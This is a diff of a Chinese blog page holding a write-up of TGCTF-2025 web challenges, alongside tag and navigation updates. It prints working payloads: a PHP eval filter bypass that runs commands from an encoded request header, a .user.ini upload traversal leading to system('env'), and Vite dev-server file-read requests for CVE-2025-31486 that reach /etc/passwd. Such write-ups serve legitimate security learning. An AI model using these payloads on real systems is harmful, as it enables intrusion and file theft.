@@ -3,33 +3,24 @@
 <head>
   <meta charset="utf-8">
   <title>TGCTF-2025复现 | MIXBP</title>
-  <meta name="keywords" content=" sql注入 , 比赛复现 , upload , RCE , CVE , 目录穿越 , 内存马 , 时间盲注 ">
+  <meta name="keywords" content=" sql注入 , 比赛复现 , upload , RCE , CVE , 目录穿越 , 内存马 , 时间盲注 , 明文攻击 , 压缩文件修复 , 时间帧隐写 , docker ">
   <meta name="description" content="TGCTF-2025复现 | MIXBP">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="GKCTF2021-easycms题目提示后台密码5位弱口令，然后扫描后台扫出admin.php登录页面，然后直接弱口令登录 12admin12345  然后成功登录后台管理页面。 然后这题有两种解法 解法1 getshell进入 设计-&gt;高级，可以找到这里有一个控制主页面的可执行代码，如果我们改成木马就可以拿到shell了 显示请在服务器创建&#x2F;var&#x2F;www&#x2F;">
+<meta name="description" content="MakePHPGreatAgain打开靶机，直接给源码 123456&lt;?phphighlight_file(__FILE__);require_once &#x27;flag.php&#x27;;if(isset($_GET[&#x27;file&#x27;])) &#123;  require_once $_GET[&#x27;file&#x27;];&#125;  这里很明显是文件包含漏">
 <meta property="og:type" content="article">
-<meta property="og:title" content="GKCTF2021-easycms">
-<meta property="og:url" content="https://mixbp.github.io/master/2025/04/17/GKCTF2021-easycms/index.html">
+<meta property="og:title" content="MakePHPGreatAgain">
+<meta property="og:url" content="https://mixbp.github.io/master/2025/04/19/MakePHPGreatAgain/index.html">
 <meta property="og:site_name" content="MIXBP">
-<meta property="og:description" content="GKCTF2021-easycms题目提示后台密码5位弱口令，然后扫描后台扫出admin.php登录页面，然后直接弱口令登录 12admin12345  然后成功登录后台管理页面。 然后这题有两种解法 解法1 getshell进入 设计-&gt;高级，可以找到这里有一个控制主页面的可执行代码，如果我们改成木马就可以拿到shell了 显示请在服务器创建&#x2F;var&#x2F;www&#x2F;">
+<meta property="og:description" content="MakePHPGreatAgain打开靶机，直接给源码 123456&lt;?phphighlight_file(__FILE__);require_once &#x27;flag.php&#x27;;if(isset($_GET[&#x27;file&#x27;])) &#123;  require_once $_GET[&#x27;file&#x27;];&#125;  这里很明显是文件包含漏">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://mixbp.github.io/image/GKCTF2021-easycms-1.png">
-<meta property="og:image" content="https://mixbp.github.io/image/GKCTF2021-easycms-2.png">
-<meta property="og:image" content="https://mixbp.github.io/image/GKCTF2021-easycms-3.png">
-<meta property="og:image" content="https://mixbp.github.io/image/GKCTF2021-easycms-4.png">
-<meta property="og:image" content="https://mixbp.github.io/image/GKCTF2021-easycms-5.png">
-<meta property="og:image" content="https://mixbp.github.io/image/GKCTF2021-easycms-6.png">
-<meta property="og:image" content="https://mixbp.github.io/image/GKCTF2021-easycms-7.png">
-<meta property="og:image" content="https://mixbp.github.io/image/GKCTF2021-easycms-8.png">
-<meta property="article:published_time" content="2025-04-17T07:41:55.000Z">
-<meta property="article:modified_time" content="2025-04-17T08:22:53.025Z">
+<meta property="article:published_time" content="2025-04-19T12:29:51.000Z">
+<meta property="article:modified_time" content="2025-04-19T12:59:01.468Z">
 <meta property="article:author" content="MIXBP">
-<meta property="article:tag" content="弱口令密码">
-<meta property="article:tag" content="getshell">
-<meta property="article:tag" content="任意文件下载">
-<meta property="article:tag" content="cms">
+<meta property="article:tag" content="require_once">
+<meta property="article:tag" content="session文件包含">
+<meta property="article:tag" content="PHP_SESSION_UPLOAD_PROGRESS">
+<meta property="article:tag" content="条件竞争">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://mixbp.github.io/image/GKCTF2021-easycms-1.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -128,7 +119,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(94)</small>
+                <small>(98)</small>
             
         </div>
     </li>
@@ -163,8 +154,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="94">
-<input type="hidden" id="yelog_site_word_count" value="181.4k">
+<input type="hidden" id="yelog_site_posts_number" value="98">
+<input type="hidden" id="yelog_site_word_count" value="184.2k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -270,6 +261,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>经典盲文</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>空格过滤绕过</a>
             </li>
         
@@ -278,7 +273,15 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>明文攻击</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>命令执行</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>摩斯密码</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -310,11 +313,19 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>时间帧隐写</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>刷题笔记</a>
             </li>
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>特殊变量名传参</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>条件竞争</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -351,6 +362,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>学习笔记</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>压缩文件修复</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -431,6 +446,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>delimiter更改sql语句结束符</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>docker</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -538,6 +557,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>misc</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>mt_srand伪随机数漏洞</a>
             </li>
         
@@ -567,6 +590,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>php_mt_seed工具</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>PHP_SESSION_UPLOAD_PROGRESS</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -642,11 +669,19 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>require_once</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>reverse</a>
             </li>
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>select load_file读取文件</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>session文件包含</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -675,6 +710,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>ssti</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>steghide隐写</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -722,6 +761,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>zip伪加密</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>ziperello工具暴力破解</a>
             </li>
         
@@ -735,6 +778,42 @@
     </div>
     
     <nav id="title-list-nav">
+        
+        
+        <a  class="All "
+           href="/2025/04/19/%E4%B9%9D%E8%BF%9E%E7%8E%AF/"
+           data-tag="zip伪加密,steghide隐写"
+           data-author="" >
+            <span class="post-title" title="c">c</span>
+            <span class="post-date" title="2025-04-19 22:29:49">2025/04/19</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/19/MakePHPGreatAgain/"
+           data-tag="require_once,session文件包含,PHP_SESSION_UPLOAD_PROGRESS,条件竞争"
+           data-author="" >
+            <span class="post-title" title="MakePHPGreatAgain">MakePHPGreatAgain</span>
+            <span class="post-date" title="2025-04-19 20:29:51">2025/04/19</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/19/%E5%81%87%E5%A6%82%E7%BB%99%E6%88%91%E4%B8%89%E5%A4%A9%E5%85%89%E6%98%8E/"
+           data-tag="经典盲文,摩斯密码"
+           data-author="" >
+            <span class="post-title" title="假如给我三天光明">假如给我三天光明</span>
+            <span class="post-date" title="2025-04-19 18:50:54">2025/04/19</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/04/17/misc%E5%AD%A6%E4%B9%A0/"
+           data-tag="misc"
+           data-author="" >
+            <span class="post-title" title="misc学习">misc学习</span>
+            <span class="post-date" title="2025-04-17 21:54:24">2025/04/17</span>
+        </a>
         
         
         <a  class="All "
@@ -793,7 +872,7 @@
         
         <a  class="All "
            href="/2025/04/15/TGCTF-2025%E5%A4%8D%E7%8E%B0/"
-           data-tag="sql注入,比赛复现,upload,RCE,CVE,目录穿越,内存马,时间盲注"
+           data-tag="sql注入,比赛复现,upload,RCE,CVE,目录穿越,内存马,时间盲注,明文攻击,压缩文件修复,时间帧隐写,docker"
            data-author="" >
             <span class="post-title" title="TGCTF-2025复现">TGCTF-2025复现</span>
             <span class="post-date" title="2025-04-15 14:10:07">2025/04/15</span>
@@ -1628,17 +1707,25 @@
             
             <a class="color5">时间盲注</a>
             
+            <a class="color5">明文攻击</a>
+            
+            <a class="color2">压缩文件修复</a>
+            
+            <a class="color1">时间帧隐写</a>
+            
+            <a class="color2">docker</a>
+            
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2025-04-17 16:24:03'>2025-04-15 14:10</time>
+            Created At : <time class="date" title='Updated At: 2025-04-19 17:13:44'>2025-04-15 14:10</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:3.1k</span>
+        <span>Count:4.7k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1668,7 +1755,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AAA%E5%81%B7%E6%B8%A1%E9%98%B4%E5%B9%B3%EF%BC%88%E5%A4%8D%E4%BB%87%EF%BC%89"><span class="toc-text">AAA偷渡阴平（复仇）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-upload"><span class="toc-text">(ez)upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFGAME"><span class="toc-text">前端GAME</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFGAME-Plus"><span class="toc-text">前端GAME Plus</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFGAME-Ultra"><span class="toc-text">前端GAME Ultra</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TGCTF2025-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86"><span class="toc-text">TGCTF2025 后台管理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TG-wordpress"><span class="toc-text">TG_wordpress</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%86%9F%E6%82%89%E7%9A%84%E9%85%8D%E6%96%B9%EF%BC%8C%E7%86%9F%E6%82%89%E7%9A%84%E5%91%B3%E9%81%93"><span class="toc-text">熟悉的配方，熟悉的味道</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#AAA%E5%81%B7%E6%B8%A1%E9%98%B4%E5%B9%B3%EF%BC%88%E5%A4%8D%E4%BB%87%EF%BC%89"><span class="toc-text">AAA偷渡阴平（复仇）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-upload"><span class="toc-text">(ez)upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFGAME"><span class="toc-text">前端GAME</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFGAME-Plus"><span class="toc-text">前端GAME Plus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFGAME-Ultra"><span class="toc-text">前端GAME Ultra</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TGCTF2025-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86"><span class="toc-text">TGCTF2025 后台管理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TG-wordpress"><span class="toc-text">TG_wordpress</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%86%9F%E6%82%89%E7%9A%84%E9%85%8D%E6%96%B9%EF%BC%8C%E7%86%9F%E6%82%89%E7%9A%84%E5%91%B3%E9%81%93"><span class="toc-text">熟悉的配方，熟悉的味道</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-zip"><span class="toc-text">ez_zip</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB"><span class="toc-text">明文攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TeamGipsy-ctfer"><span class="toc-text">TeamGipsy&amp;ctfer</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1684,7 +1771,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="AAA偷渡阴平（复仇）"><a href="#AAA偷渡阴平（复仇）" class="headerlink" title="AAA偷渡阴平（复仇）"></a>AAA偷渡阴平（复仇）</h1><p>源码：</p>
+        <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="AAA偷渡阴平（复仇）"><a href="#AAA偷渡阴平（复仇）" class="headerlink" title="AAA偷渡阴平（复仇）"></a>AAA偷渡阴平（复仇）</h2><p>源码：</p>
 <figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"> <span class="hljs-variable">&lt;?php</span><br><span class="hljs-variable"></span><br><span class="hljs-variable"></span><br><span class="hljs-variable">$tgctf2025=$_GET[&#x27;tgctf2025&#x27;];</span><br><span class="hljs-variable"></span><br><span class="hljs-variable">if(!preg_match(&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\\\\</span>|<span class="hljs-string">localeconv</span>|<span class="hljs-string">pos</span>|<span class="hljs-string">current</span>|<span class="hljs-string">print</span>|<span class="hljs-string">var</span>|<span class="hljs-string">dump</span>|<span class="hljs-string">getallheaders</span>|<span class="hljs-string">get</span>|<span class="hljs-string">defined</span>|<span class="hljs-string">str</span>|<span class="hljs-string">split</span>|<span class="hljs-string">spl</span>|<span class="hljs-string">autoload</span>|<span class="hljs-string">extensions</span>|<span class="hljs-string">eval</span>|<span class="hljs-string">phpversion</span>|<span class="hljs-string">floor</span>|<span class="hljs-string">sqrt</span>|<span class="hljs-string">tan</span>|<span class="hljs-string">cosh</span>|<span class="hljs-string">sinh</span>|<span class="hljs-string">ceil</span>|<span class="hljs-string">chr</span>|<span class="hljs-string">dir</span>|<span class="hljs-string">getcwd</span>|<span class="hljs-string">getallheaders</span>|<span class="hljs-string">end</span>|<span class="hljs-string">next</span>|<span class="hljs-string">prev</span>|<span class="hljs-string">reset</span>|<span class="hljs-string">each</span>|<span class="hljs-string">pos</span>|<span class="hljs-string">current</span>|<span class="hljs-string">array</span>|<span class="hljs-string">reverse</span>|<span class="hljs-string">pop</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">content</span>|<span class="hljs-string">echo</span>|<span class="hljs-string">readfile</span>|<span class="hljs-string">highlight</span>|<span class="hljs-string">show</span>|<span class="hljs-string">source</span>|<span class="hljs-string">file</span>|<span class="hljs-string">assert/i&quot;, $tgctf2025))&#123;</span><br><span class="hljs-string">    //hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span><br><span class="hljs-string">    eval($tgctf2025);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">else&#123;</span><br><span class="hljs-string">    die(&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">highlight_file(__FILE__);</span><br></code></pre></td></tr></table></figure>
 
 <p>这题就是之前那题的升级版，把无参数RCE给ban了，依旧是让我们去使用eval危险函数进行命令执行。</p>
@@ -1707,7 +1794,7 @@
 <figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">?tgctf2025=<span class="hljs-meta">system</span>(hex2bi<span class="hljs-meta">n</span>(lcfirst(<span class="hljs-keyword">key</span>(apache_request_headers()))));<br><br>bp抓包然后在请求头里添加一个636174202f666c6167: 123<br></code></pre></td></tr></table></figure>
 
 <hr>
-<h1 id="ez-upload"><a href="#ez-upload" class="headerlink" title="(ez)upload"></a><strong>(ez)upload</strong></h1><p>当时做这题我就想着能够传入.user.ini但是上传目录中没有.php文件，无法实现包含，所以搞得一头雾水，结果看完题解说能够目录传越将.user.ini传到上级目录直接人傻了，而且上级目录有两个.php文件，直接能实现包含。</p>
+<h2 id="ez-upload"><a href="#ez-upload" class="headerlink" title="(ez)upload"></a><strong>(ez)upload</strong></h2><p>当时做这题我就想着能够传入.user.ini但是上传目录中没有.php文件，无法实现包含，所以搞得一头雾水，结果看完题解说能够目录传越将.user.ini传到上级目录直接人傻了，而且上级目录有两个.php文件，直接能实现包含。</p>
 <p>访问url&#x2F;upload.bak把源码下载下来</p>
 <p>代码审计</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UPLOAD_PATH&#x27;</span>, <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/uploads/&#x27;</span>);<br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$status_code</span> = <span class="hljs-number">200</span>; <span class="hljs-comment">// 默认状态码为 200</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php4&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;php2&quot;</span>, <span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;htm&quot;</span>, <span class="hljs-string">&quot;phtml&quot;</span>, <span class="hljs-string">&quot;pht&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jspx&quot;</span>, <span class="hljs-string">&quot;jsw&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jspf&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>, <span class="hljs-string">&quot;asp&quot;</span>, <span class="hljs-string">&quot;aspx&quot;</span>, <span class="hljs-string">&quot;asa&quot;</span>, <span class="hljs-string">&quot;asax&quot;</span>, <span class="hljs-string">&quot;ascx&quot;</span>, <span class="hljs-string">&quot;ashx&quot;</span>, <span class="hljs-string">&quot;asmx&quot;</span>, <span class="hljs-string">&quot;cer&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>, <span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file_name</span>, PATHINFO_EXTENSION);<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$temp_file</span>);<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?&lt;/s&#x27;</span>, <span class="hljs-variable">$file_content</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件内容包含非法字符，禁止上传！&#x27;</span>;<br>                <span class="hljs-variable">$status_code</span> = <span class="hljs-number">403</span>; <span class="hljs-comment">// 403 表示禁止访问</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-variable">$file_name</span>;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                    <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件上传成功！&#x27;</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>                    <span class="hljs-variable">$status_code</span> = <span class="hljs-number">500</span>; <span class="hljs-comment">// 500 表示服务器内部错误</span><br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;禁止保存为该类型文件！&#x27;</span>;<br>            <span class="hljs-variable">$status_code</span> = <span class="hljs-number">403</span>; <span class="hljs-comment">// 403 表示禁止访问</span><br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>        <span class="hljs-variable">$status_code</span> = <span class="hljs-number">404</span>; <span class="hljs-comment">// 404 表示资源未找到</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 设置 HTTP 状态码</span><br><span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-variable">$status_code</span>);<br><br><span class="hljs-comment">// 输出结果</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<br>    <span class="hljs-string">&#x27;status_code&#x27;</span> =&gt; <span class="hljs-variable">$status_code</span>,<br>    <span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-variable">$msg</span>,<br>]);<br></code></pre></td></tr></table></figure>
@@ -1732,7 +1819,7 @@
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/<span class="hljs-keyword">index</span>.php?cmd=<span class="hljs-keyword">system</span>(&quot;env&quot;);<br>或/upload.php?cmd=<span class="hljs-keyword">system</span>(&quot;env&quot;);<br></code></pre></td></tr></table></figure>
 
 <hr>
-<h1 id="前端GAME"><a href="#前端GAME" class="headerlink" title="前端GAME"></a>前端GAME</h1><p>做这题以为和其他前端小游戏题一样，要么改分要么直接触发通关，结果看题解说是CVE任意文件读取</p>
+<h2 id="前端GAME"><a href="#前端GAME" class="headerlink" title="前端GAME"></a>前端GAME</h2><p>做这题以为和其他前端小游戏题一样，要么改分要么直接触发通关，结果看题解说是CVE任意文件读取</p>
 <p>先查看源码</p>
 <p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-3.png"></p>
 <p>提示flag在&#x2F;tgflagggg，但是并没有找到相关读取功能，但是可以检索到相关CVE：</p>
@@ -1741,25 +1828,25 @@
 <p>payload：</p>
 <figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspectj">/<span class="hljs-meta">@fs</span>/tgflagggg?<span class="hljs-keyword">import</span>&amp;raw??<br></code></pre></td></tr></table></figure>
 
-<h1 id="前端GAME-Plus"><a href="#前端GAME-Plus" class="headerlink" title="前端GAME Plus"></a><strong>前端GAME Plus</strong></h1><p>考点总结：CVE-2025-31486 </p>
+<h2 id="前端GAME-Plus"><a href="#前端GAME-Plus" class="headerlink" title="前端GAME Plus"></a><strong>前端GAME Plus</strong></h2><p>考点总结：CVE-2025-31486 </p>
 <p>Vite开发服务器任意文件读取漏洞 题目描述：非常适合新生的前端小游戏Plus版，真的吗。 WP： CVE-<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkyMTcwNjg4Mw==&mid=2247483811&idx=1&sn=2b4403023fd911f611bf5590ea3796d6&scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzkyMTcwNjg4Mw==&amp;mid=2247483811&amp;idx=1&amp;sn=2b4403023fd911f611bf5590ea3796d6&amp;scene=21#wechat_redirect</a></p>
 <p>flag在根目录下 &#x2F;tgflagggg 中 </p>
 <figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crystal">/etc/passwd?.svg?.wasm?init<br><span class="hljs-regexp">/tgflagggg?.svg?.wasm?init</span><br><span class="hljs-regexp">#这个打法，不太好猜路径</span><br><span class="hljs-regexp">curl &quot;http:/</span><span class="hljs-regexp">/node1.tgctf.woooo.tech:32613/</span><span class="hljs-variable">@fs</span>/app/?<span class="hljs-regexp">/../</span>../../../../tgflagggg?<br>import&amp;?raw<br></code></pre></td></tr></table></figure>
 
 <hr>
-<h1 id="前端GAME-Ultra"><a href="#前端GAME-Ultra" class="headerlink" title="前端GAME Ultra"></a><strong>前端GAME Ultra</strong></h1><p>考点总结：CVE-2025-32395 </p>
+<h2 id="前端GAME-Ultra"><a href="#前端GAME-Ultra" class="headerlink" title="前端GAME Ultra"></a><strong>前端GAME Ultra</strong></h2><p>考点总结：CVE-2025-32395 </p>
 <p>Vite开发服务器任意文件读取漏洞（兵不厌诈） 题目描述：非常适合新生的前端小游戏Ultra版，真的吗。 WP： CVE-2025-32395 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/HMhzXqSplWa-IwpftxwTiA">https://mp.weixin.qq.com/s/HMhzXqSplWa-IwpftxwTiA</a></p>
